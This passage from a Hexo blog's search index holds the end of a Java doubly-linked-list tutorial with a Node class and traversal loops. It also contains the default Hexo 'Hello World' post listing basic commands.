rw.prev=java;<br>        <br>        Node first=java;<br>        Node last=urm;<br>        <br>        Node <span class="hljs-keyword">temp</span>=first;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-keyword">temp</span>!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">temp</span>);<br>            <span class="hljs-keyword">temp</span>=<span class="hljs-keyword">temp</span>.next;<br>        &#125;<br>        <br>        <span class="hljs-keyword">temp</span>=last;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-keyword">temp</span>!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">temp</span>);<br>            <span class="hljs-keyword">temp</span>=<span class="hljs-keyword">temp</span>.prev;<br>        &#125;<br>        <br>    &#125;<br>    <br>&#125;<br><span class="hljs-keyword">class</span> Node&#123;<br>    <span class="hljs-built_in">public</span> Node prev;<br>    <span class="hljs-built_in">public</span> Node next;<br>    <span class="hljs-built_in">public</span> <span class="hljs-keyword">Object</span> item;<br>    <br>    <span class="hljs-built_in">public</span> Node(<span class="hljs-keyword">Object</span> item) &#123;<br>        this.item = item;<br>    &#125;<br>    <br>    @Override<br>    <span class="hljs-built_in">public</span> String toString() &#123;<br>        <span class="hljs-keyword">return</span> &quot;Node&#123;&quot; + &quot;item=&quot; + item + <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>表格</p><table><thead><tr><th>1</th><th>2</th><th>3</th></tr></thead><tbody><tr><td>4</td><td>5</td><td>6</td></tr><tr><td>7</td><td>8</td><td>9</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Other</category>
      
    </categories>
    
    
    <tags>
      
      <tag>other</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/11/06/hello-world/"/>
    <url>/2024/11/06/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
